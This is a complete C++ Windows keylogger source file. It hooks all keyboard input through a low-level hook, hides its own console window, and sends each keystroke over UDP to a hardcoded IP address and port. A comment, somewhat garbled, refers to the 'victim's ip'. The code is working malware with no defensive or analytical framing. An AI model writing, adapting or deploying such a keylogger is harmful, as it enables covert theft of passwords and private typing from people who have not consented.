#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#pragma comment(lib, "Ws2_32.lib")

int sock;
sockaddr_in server_address;

LRESULT CALLBACK KBDHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT hooklParam = (PKBDLLHOOKSTRUCT)lParam;

	switch (wParam)
	{
		default:
			char keyCode = MapVirtualKey(hooklParam->vkCode, MAPVK_VK_TO_CHAR);
			std::cout << keyCode << std::endl;
		
			int result = sendto(sock, &keyCode, 1, 0, (sockaddr*)&server_address, sizeof(server_address));
			if (result == SOCKET_ERROR) {
				std::cerr << "Failed to send key: " << WSAGetLastError() << std::endl;
			}
			else {
				std::cout << "Key sent: " << keyCode << std::endl;
			}
			break;
		
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void)
{
	// mandatory for running the process in background
	ShowWindow(::GetConsoleWindow(), SW_HIDE);

	WSADATA wsa_data;
	int result = WSAStartup(MAKEWORD(2, 2), &wsa_data);
	if (result != 0) {
		std::cerr << "WSAStartup failed, error code: " << WSAGetLastError() << std::endl;
		return 1;
	}

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock < 0) {
		std::cerr << "Failed to create socket, error code: " << WSAGetLastError() << std::endl;
		return 1;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(6666);

	// replace ip address with the victim's ip
	inet_pton(AF_INET, "172.24.255.191", &server_address.sin_addr);

	HHOOK hkb = SetWindowsHookEx(WH_KEYBOARD_LL, &KBDHook, 0, 0);
	MSG message;
	while (GetMessage(&message, NULL, NULL, NULL) > 0)
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
	
	UnhookWindowsHookEx(hkb);
	closesocket(sock);
	WSACleanup();

	return 0;
}